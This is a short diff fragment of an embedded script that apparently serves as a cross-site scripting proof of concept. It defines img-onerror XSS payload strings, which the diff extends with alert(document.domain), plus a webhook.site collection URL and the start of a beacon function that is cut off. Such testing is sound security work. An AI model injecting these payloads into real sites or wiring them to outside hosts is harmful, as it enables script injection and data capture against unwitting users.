@@ -12,8 +12,8 @@
 <script>
 (function(){
   var WHOOK = 'https://webhook.site/2f46c8b8-f0fd-40a4-9f77-e143d6faaa34';
-  var NOTICE = '<img src=x onerror="window.__xss=1">';
-  var HOTQ   = '<img src=y onerror="window.__hotq=1">';
+  var NOTICE = '<img src=x onerror="window.__xss=1;alert(document.domain)">';
+  var HOTQ   = '<img src=y onerror="window.__hotq=1;alert(document.domain)">';
 
   function beacon(kind, payload){
     try {
